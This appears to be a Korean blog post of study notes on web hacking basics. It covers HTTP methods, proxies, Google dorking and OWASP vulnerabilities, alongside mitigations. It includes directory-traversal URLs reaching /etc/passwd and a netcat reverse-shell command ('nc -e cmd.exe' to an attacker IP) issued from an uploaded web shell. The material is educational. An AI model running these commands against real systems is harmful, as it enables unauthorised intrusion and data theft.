---
title: "웹해킹 기초"
category:
  - web
tag:
  - web
toc: true
toc_sticky: true
auto_ids: true
---

# REQUEST와 RESPONSE

## HTTP Request
웹 서버에 데이터를 요청하거나 전송할 때 보내는 패킷. 주로 GET, POST와 같은 메소드를 사용한다.fdasasd

GET
요청 데이터에 대한 인수를 URL을 통해 전송한다.
www.wishfree.or.kr/list.php?page=1&search=test
각 이름과 값을 글자 수를 255자로 제한한다.
보안에 매우 취약

POST 방식
URL에 요청 데이터를 기록하지 않고 HTTP 헤더에 데이터를 전송한다.
내부의 구분자가 각 파라미터(이름과 값)를 구분하며, 서버가 각 구분자에 대한 내용을 해석하여 데이터를 처리하기 때문에 GET 방식에 비해 상대적으로 처리 속도가 늦다. POST 방식에서는 인수 값을 URL을 통해 전송하지 않기 때문에 다른 이가 링크를 통해 해당 페이지를 볼 수 없다.
게시판 등에서 파일 업로드는 POST방식으로만 할 수 있는데, GET 방식과는 달리 보내려는 데이터가 URL을 통해서 노출되지 않기 때문에 최소한의 보안성은 갖추고 있다. 일반적으로 게시판의 목록이나 글 보기 화면은 접근 자유도를 부여하기 위해 GET 방식을 사용하고 글 저장/수정/삭제나 많은 양의 데이터를 전송할 때는 POST 방식을 사용한다.

기타 방식
자주 사용하진 않는다
HEAD : 서버 측의 데이터를 검색하고 요청하는데 사용된다.
OPTIONS : 자원에 대한 요구/응답 관계에서 관련된 선택 사항의 정보를 요청할 때 사용된다. 이를 통해 클아이언트는 어느 것을 선택할지 결정할 수 있고, 자원과 관련된 필요 사항도 결정할 수 있다. 또한 서버의 수행 능력도 알아볼 수 있다.
PUT : 메시지에 포함되어 있는 데이터를 지정한 URI 장소에 그 이름으로 저장한다.
DELETE : URL에 지정되어 있는 자원을 서버에서 지울 수 있게 한다.
TRACE : 요구 메시지의 최종 수신처까지의 루프백 검사용으로 쓰인다. 즉 클아이언트가 보내는 요구 메시지가 거쳐가는 프록시나 게이트웨이의 중간 경로 및 최송 수신서버까지 이르는 경로를 알아내는데 사용된다.

## HTTP Response
클라이언트의 HTTP Request에 대한 응답 패킷이다. 서버에서 쓰이고 있는 프로토콜 버전, Request에 대한 실행 결과 코드 및 간략한 실행 결과 설명문에 대한 내용이 담겨있다. 전달할 데이터의 형식과 데이터 길이 등과 같은 추가 정보가 MIME 형식으로 표현되어 있는데, 헤더 정보 뒤에는 실제 데이터(HTML이나 그림파일)가 전달되며 데이터 전달이 끝나면 서버는 연결을 끊는다. HTTP Response의 주요 싫애 결과 코드는 다음과 같다.



# 웹 서비스

## HTML

## SSS
Server Side Script
ASP나 JSP같은 동적인 페이지를 제공하는 스크립트

## CSS



# 웹 해킹

## 웹 취약점 스캐너를 통한 정보 수집
- 웹의 메뉴를 하나하나 클릭해보며 수작업으로 동작을 파악
- 웹 취약점 스캐너 사용

웹 스캐너 : 각 페이지의 링크 정보를 따라가며 사이트 구조를 분석한다. 빠른 시간 내에 다양한 접속 시도를 수행할 수 있지만, 웹 프로그램은 자유스럽게 만들어지고 변형도 다양해서 취약점을 정확히 잡아내기란 거의 불가능하다.
따라서 스캐너를 통해 발견된 취약점은 개별 확인 과정을 거쳐 유효성을 확인하는 과정이 필요하다.

Web Zip : 각 페이지에서 링크 정보를 따라가며 웹 사이트의 웹 페이지를 로컬에 저장해주는 프로그램
Acunetix Web Vulnerability Scanner

## 웹 프록시를 통한 취약점 분석
웹의 구조를 파악하거나 취약점을 점검, 혻은 웹 해킹을 할 때 사용한다.
일반적으로 웹 해킹에 사용되는 웹 프록시는 클아이언트에 설치되며 클아이언트의 통제를 받는다. 즉 클라이언트가 웹 서버와 웹 브라우저 간에 전달되는 모든 HTTP 패킷을 웹 프록시를 통해서 확인하면서 수정하는 것이 가능하다.

burp suite : http://portswigger.net/burp/ 실행하려면 JRE가 필요하다.

클아이언트의 웹 브라우저의 패킷이 웹 프록시로 향하도록 설정하는 방법
[도구]-[인터넷 보안]-[LAN 설정]-[프록시 서버]
127.0.0.1:8080   (루프 백(loopback) 주소)
주프 백 주소 : 시스템 자기 자신을 의미하는 것. 127.0.0.1은 항상 시스템 자신을 의미한다.

### 서버에서 클라이언트로 전송되는 패킷 변조
웹 프록시의 유용한 점은 서버와 클라이언트 사이의 패킷을 볼 수 있는 것 이외에 서버와 클라이언트 사이에 전달되는 과정에서 패킷을 위변조할 수 있다는 점이다.
어떤 언어로 개발됐든지 웹 프록시를 통해서 확인하는 것은 HTML이다.

이런 공격은 자기자신을 해킹한 것이어서 의문을 가질 수 있는데, 다음  2개의 경우에는 위력을 가질 수 있다.
1) 클라이언트에 해킹하고자 하는 대상이 있는 경우. 위에서는 웹 브라우저 내용만 바꾸었지만 실제로는 Active X 등의 형태로 여러 프로그램이 클라이언트에 설치되어 웹 서비스를 제공하는 경우가 많은데, 이때 클라이언트에 설치된 서비스 프로그램을 속이는 것이 가능하다.
1) 서버에서 클라이언트에 정보를 전송했따가 이를 다시 전송받아 처리하는 경우.

서버가 클라이언트로 보낸 데이터의 변조로 인해 발생하는 위험을 없애려면 서버에서 클라이언트로 전송한 값은 어떤 것도 다시 참조하지 않아야 한다. 하지만 이외로 데이터 재참조 방식은 많이 사용되고 있다.

### 클라이언트에서 서버로 전송되는 패킷 변조
이 공격이 서버에서 클라이언트 전송되는 패킷을 변조했을 때처럼 위험하다고는 생각하지 않을 것이다.
그러나 일반적인 웹서비스의 메뉴상 접속할 수 없는 것에 접근하거나 특정한 값을 넣어 시스템의 오작동을 유도하기 위한 목적으로 사용된다.

## 구글 해킹을 통한 정보 수집
웹 해킹을 하면서 많은 정보를 수집하기 위해서는 검색 엔진을 이용하면 유용하다. 검색 엔진 중에는 구글이 많이 사용되는데, 구글은 다음과 같은 다양한 고급 검색 기능을 제공한다.

|검색 인자|설명|검색 추가 인자|
|site|특정 도메인으로 지정한 사이트에서 검색하려는 문자열이 포함된 사이트를 찾음|YES|
|filetype|특정한 파일 유형에 한해서 검색하는 문자가 들어 있는 사이트를 찾음|YES|
|link|링크로 검색하는 문자가 들어 있는 사이트를 찾음|NO|
|cache|특정 검색어에 해당하는 캐시된 페이지를 보여줌|NO|
|intitle|페이지의 제목에 검색하는 문자가 들어 있는 사이트를 찾음|NO|
|inurl|페이지의 URL에 검색하는 문자가 들어 있는 사이트를 찾음||

예시
site:wishfree.com admin
filetype:txt 패스워드
intitle:index.of admin

### 검색 엔진의 검색을 피하는 방법
검색 엔진에 의한 취약점은 비교적 많이 알려져 있따. 가장 일반적인 대응법은 웹 서버의 홈 디렉터리에 robots.txt 파일을 만들어 검색할 수 없게 만드는 것이다. http://www.wishfree.com/robots.txt 파일이 있으면 구글 검색 엔진은 robots.txt에 있는 디렉터리는 검색하지 않는다.
robots.txt 파일 내용의 형식은 매우 간단하고 두 개의 필드로 구성할 수 있으며 User-agent와 Disallow를 이용한다. User-agent는 검색 엔진의 검색을 막고 Disallow 필드는 특정 파일이나 디렉터리를 로봇이 검색하지 못하게한 다.

~~~
User-agent: googlebot  //구글 검색 엔진의 검색을 막는다.
User-agent: *  //모든 검색 로봇의 검색을 막는다.
Disallow: dbconn.ini  //dbconn.ini 파일을 검색하지 못하게 한다.
Disallow: /admin/  //admin 디렉터리에 접근하지 못하게 한다.
~~~

미국 백악관에서 실제로 사용하는 robot.txt 파일의 내용을 살펴보는 것도 좋은 공부가 될 것이다.
http://www.whitehouse.gov/robots.txt



# 국제웹보안표준기구 OWASP에서는 해마다 웹 관련 상위 10개의 주요 취약점을 발표하고 있다.

## SQL Injection
로그인뿐만 아니라 웹에서 사용자의 입력 값을 받아 데이터베이스에 SQL문으로 데이터를 요청하는 모든 곳에 가능하다. 주로 웹에서 게시판 검색, 우편 번호 검색 등 대량의 정보를 검색하는 부분에서 웹 서버와 데이터베이스의 연동이 일어나기 때문에 그곳을 공략하면 SQL 삽입 공격을 수행할 수 있다.

## XSS 취약점
공격자가 작성한 스크립트가 다른 사용자에게 전달되는 것
다른 사용자의 웹 브라우저 내에서 적절한 검증 없이 실행되기 때문에 사용자의 세션을 탈취하거나, 웹 사이트를 변조하거나 혹은 악의적인 사이트로 사용자를 이동시킬 수 있다.

## 취약한 인증 및 세션 관리
### 취약한 패스워드 설정
### 사용자 측 데이터를 이용한 인증
- 세션이나 쿠키로 수신한 인증 허용 값이 유효한 인증인지 확인할 때, 공격자가 전달해주는 값(아이디 및 사용자 고유번호 등)을 이용해 해당 인증의 소유자(Identity)를 구분한다.
즉, 공격자는 세션 인증 값은 그대로 사용하고 UserNo 값만 변경함으로써 다른 계정으로 로그인한 것처럼 웹 서비스를 이용할 수 있게 된다.
이러한 문제점은 기본적으로 최초 인증 이후에 인증과 자신의 신분을 밝히는 주체를 클라리언트에게 넘겼기 때문이다. 이처럼 인증에서뿐만 아니라 데이터의 신뢰도에 대한 증명의 권한을 클라이언트에게 넘기면 클라이언트는 얼마든지 그것을 악용할 수 있다. 웹의 많은 취약점을 그저 편리하다는 이유로 자신이 적용해야할 통제를ㅋ ㅡㄹ라이언트에게 넘기는데 있음을 기억해야 한다.

## 직접 객체 참조
파일, 디렉터리, 데이터베이스 키와 같이 내부적으로 구현된 객체에 대한 참조가 노출될 때 발생한다. 접근 통제에 의한 확인이나 다른 보호 조치가 없다면 공격자는 권한 없는 데이터에 접근하기 위해 노출된 참조를 조작할 수 있다.

### 디렉터리 탐색
웹 브라우저에서 확인 가능한 경로의 상위로 탐색하여 특정 시스템 파일을 다운로드하는 공격 방법
자료실에 올라간 파일을 다운로드할 때 전용 다운로드 프로그램이 파일을 가져오는데, 이때 파일 이름을 필터링하지 않아서 발생하는 취약점
게시판 등에서 첨부파일을 다운로드할 대 다음과 같이 down.jsp 형태의 SSS를 주로 사용한다.
http://www.wishfree.com/board/download.jsp?filename=사업계획.hwp
그렇다면 게시판에서 글 목록을 보여주는 http://www.wishfree.com/board에 위차한다면 존재하는 list.jsp 파일을 어떻게 다운로드할 수 있을까?
이런 경우에는 주소창에 다음 주소를 입력한다.
http://www.wish.free.com/board/download.jsp?filename=../list.jsp
http://www.wish.free.com/board/download.jsp?filename=../admin/adminlogin.jsp
http://www.wish.free.com/board/download.jsp?filename=../download.jsp
http://www.wish.free.com/board/download.jsp?filename=../../../../../../etc/passwd
위와 같이 입력하면 실제로 /etc/passwd 파일을 다운로드하는 것이 가능했따면, 우리는 웹 소스가 있는 디렉터리에서 7번째의 상위 디렉터리가 루트 디렉터리임을 알 수 있다. 물론 한 번에 몇 번째인지 알아낼 수 없고 대략 4~9번재 사이라고만 짐작할 수 있기 때문에 몇 번의 시행착오를 거쳐야 한다. 이는 download.jsp의 인수 값인 파일 이름에서 특수문자 등이 존재하는지 여부를 필터링하지 않아 발생하는 취약점이다. 따라서 파일 다운로드 전용 프로그램을 작성하여 사용할 때는 위의 예처럼 ..이나 / 문자열에 대한 필터링이 없으면 공격자가 상위로 올라가 특정 파일을 열람할 수 있으므로 ../과 / 문자를 필터링해야한다.

### 파일 업로드 제한 부재
클라이언트에서 서버 측으로 임의의 파일을 보낼 수 있는 취약점은 웹서버가 가질 수 있는 가장 치명적인 
첨부파일로 악의적인 파일을 업로드하고 실행시키는 것. 이때 첨부파일로 업로드하는 악성 코드는 대부분 웹쉘이다.
일반적인 첨부파일이 아니더라도, 이력서에 사진 올리는 곳에도 서버 측에 파일을 보낼 수 있는 경로가 모두 이용될 수 있다. 또한 서버 측에 파일을 보내는 방법이 노출되어 있는 경우 외에, 개발하는 과정에서 또는 운영자가 사용하기 위해 만들어놓은 파일 업로드 코드가 발견되어 공격자에게 악용되는 경우도 있다.

### 리버스 텔넷
웹 해킹을 통해 시스템의 권한을 획득한 후 해당 시스템에 텔넷과 같이 직접 명령을 입력하고 확인할 수 있는 쉘을 획득하기 위한 방법.
방화벽이 존재하는 시스템을 공격할 때 자주 사용된다.
일반적으로 웹 서버는 방화벽 내부에 존재하는데, 웹 서버는 80번 포트를 이용한 웹 서비스만 제공하면 되기 때문에 방화벽은 외부 인터넷을 사용하는 사용자에 대해 80포트만을 허용한다. 이런 경우에는 웹 서버의 텔넷이 열려 있어도 방화벽으로 인해 공격자가 외부에서 접근할 수 없다.
심화된 공격을 하기 위해서는 텔넷과 유사한 접근 권한을 획득하는 것이 매우 중요한데, 이때 리버스 텔넷이 유용하다. 방화벽에서 인바운드 정책(외부에서 방화벽 내부로 들어오는 패킷에 대한 정책)은 80번 포트 외에 필요한 포트만 빼고 다 막아 놓지만, 아웃바운드 정책(내부에서 위부로 나갈 때에 대한 정책)은 별다른 필터링을 수행하지 않는 경우가 많다. 리버스 텔넷은 바로 이런 허점을 이용한다.
공격자의 PC에 텔넷 서비스가 열려 있다면 웹 서버에서 공격자로 텔넷 접속이 가능할까? 물론 가능하다. 방화벽의 아웃바운드 정책이 열려 있다면 말이다.
그렇다면 웹 서버에서 공격자 PC로 텔넷 연결을 허용하고 있는 상황을 공격자가 이용할 수는 없을까? 가능하다. 이것이 바로 리버스 텔넷이다. 하지만 웹 서버에서 공격자 PC로 텔넷 접속을 하려면 그 전에 웹 서버에서 권한을 획득해야 한다. 권한 획득 시에는 보통 파일 업로드 공격을 이용하는데 웹 쉘 업로드를 통해 시스템에 명령을 입력할 수 있는 명령창을 얻는 것이다. 그리고 서버 측에 리버스 텔넷을 위한 툴을 업로드하는데, 보통 nc(netcat)라는 툴을 많이 쓴다.
웹 브라우저를 이용한 명령창을 얻었다고 가정하고 nc 파일을 업로드하여 리버스 텔넷을 실행하는 과정을 자세히 살펴보자.
1) 명령창 획득 : 파일 업로드 등을 통해 공격자가 명령을 입력할 수 있는 명령창을 획득한다.
2) 리버스 텔넷용 툴 업로드 : nc와 같은 리버스 텔넷용 툴을 서버 게시판의 파일 업로드 기능을 이용해 업로드한다.
3) 공격자 PC 리버스 텔넷 데몬 활성화 : 서버에서 리버스 텔넷을 보내면 이를 받아 텔넷을 열 수 있도록 다음과 같이 리버스 텔넷 툴을 실행시킨다.
nc -l -p 80
4) 획득한 명령창을 통해 공격자에게 리버스 텔넷을 보내준다. 업로드한 nc 파일이 위치한 전체 경로를 입력해줘야 하며 이때 공격자 IP는 192.168.137.1이다.
c:\inetpub\wwwroot\bbs\upload\nc -e cmd.exe [공격자 IP] 80

리버스 텔넷을 막기 위해서는 파일 업로드를 먼저 막아야 한다. 그리고 asp뿐만 아니라 리버스 텔넷 종류를 실행하지 못하도록 exe나 com 같은 실행 파일의 업로드도 막아야 한다. 또한 외부에서 내부로의 접속뿐만 아니라 내부에서 외부로의 불필요한 접속도 방화벽으로 막는 것이 좋다.

### CSRF 취약점
특정 사용자를 대상으로 하지 않고, 불특정 다수를 대상으로 로그인된 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록, 송금 등)를 하게 만드는 공격이다. CSRF는 기본적으로 XSS 공격과 매우 유사하며 XSS 공격의 발전된 형태라고 보기도 한다. 하지만 XSS 공격은 악성 스크립트가 클라이언트에서 실해오디는데 반해, CSRF 공격은 사용자가 악성 스크립트를 서버에 요청한다는 차이가 있다.
일반적으로 CSRF가 성립하려면 수정, 삭제, 등록하는 액션에서 사용자를 구분하는 파라메터 값이 존재하지 않아야 한다. 특정한 사용자를 구분하는 인수가 있으면 하나의 사용자에게만 적용되거나 인증 과정을 통해 CSRF 공격을 막을 수 있다.

### 보안 설정 취약점
- 디렉터리 리스팅
- 백업 및 임시 파일 존재
공격자의 입장에서 백업 파일을 발견하면 웹 어플리케이션의 내부 로직 및 데이터베이스 접속 정보 등 중요한 정보를 획득할 수 있다.
흔히 login.asp 파일이 웹 서버의 편집 프로그램이 자동으로 생성하는 login.asp.bak과 같은 형태로 남는 경우를 말한다.
- 주석 관리 미흡
일반적으로 프로그램의 주석은 개발자만 볼 수 잇으나, 웹 어플리케이션의 경우에는 웹프록시를 통해 이용자도 볼 수 있다. 주석에는 개발 과정이나 웹 어플리케이션의 관리 목적으로 주요 로직에 대한 설명, 디렉터리 구조 ,테스트 소스 정보, 심지어는 아이디와 패스워드 등의 여러 가지 정보가 기록될 수 있다. 따라서 웹 어플리케이션 개발 시에는 주석에 기록되는 정보를 주의할 필요가 있다.

### 취약한 정보 저장 방식
보호하려는 데이터의 중요도에 따라 암호화 로직 사용
데이터베이스 테이블 단위에어 암호화를 수행

### URL 접근 제한 실패
관리자 페이지가 추측하기 쉬운 URL을 가지거나 인증이 필요한 페이지에 대한 인증 미처리로 인해 인증을 우회하여 접속할 수 있는 취약점
이 취약점에 노출되면 일반 사용자나 로그인하지 않은 사용자가 관리자 페이지에 접근하여 관리자 권한의 기능을 악용할 수 있다. 간단하지만 웹 개발자가 의외로 자주 실수하는 부분이다.
원래는 관리자로 로그인해야 관리자용 웹 페이지에 접속할 수 있는 것인데, 로그인하지 않고도 특정 작업이 가능한 경우가 발생한다.
예를 들면 /admin/login.asp를 통해 관리자로 로그인한 후에야 /admin/boardadmin.asp에 접근할 수 있어야 하는데, 관리자로 로그인하지 않은 채 /admin/boardadmim.asp에 바로 접근해 게시판을 관리하는 경우이다.
인증 우회를 막기 위해서는 웹에 존재하는 중요 페이지에 세션 값(쿠키)을 확인하도록 검증 로직을 입력해둬야 한다. 웹 프로그래머의 시룻나 게으름으로 인해 세션에 대한 검증 로직을 생략하면, 웹 개발자가 만들어놓은 웹 이용 시나리오 중간에 공격자가 끼어들어 인증을 거치지 않고 자신이 원하는 기능을 사용할 수 있다. 이런 인증에 대한 보안 문제는 아주 간단하지만 보안에서는 큰 문제를 일으킬 수 있으므로 ,프로그램을 개발할 때는 표준 인증 로직을 만들어 웹에 존재하는 모든 페이지의 앞부분에 입력해야 한다.

### 인증 시 비암호화 채널 사용
최근에는 인터넷뱅킹과 같이 보안성이 중요한 시스템에서는 웹 트래픽을 암호화한다. 이 때 사용되는 암호화 알고리즘이 약하거나 암호화하는 구조에 문제가 있다면 웹 트래픽은 복호화되거나 위변조될 수 있다.


### 부적절한 오류 처리
웹 페이지를 이용하다보면 자동으로 다른 페이지로 리다이렉트하거나 포워드하는 경우가 종종 발생한다. 이때 목적 페이지에 리다이렉트하기 위해 신뢰되지 않은 데이터를 사용하는 경우가 있는데, 적절한 확인 절차가 없으면 공격자는 피해자를 피싱 사이트나 악의적인 사이트로 리다이렉트할 수 있고, 권한 없는 페이지의 접근을 위해 사용할 수도 있다.



# 웹의 취약점 보완

## 특수문자 필터링
웹 취약점은 다양하지만 대부분 몇 가지 보완을 통해 막을 수 있다. 가장 대표적인 것이 특수문자 필터링이다. 웹 해킹의 가장 기본적인 형태 중 하나가 인수 조작인데 인수 조작은 예외적인 실행을 유발시키기 위해 일반적으로 특수문자를 포함하게 되어 있다. 각 주요 공격은 다음과 같은 특수문자를 사용한다.





















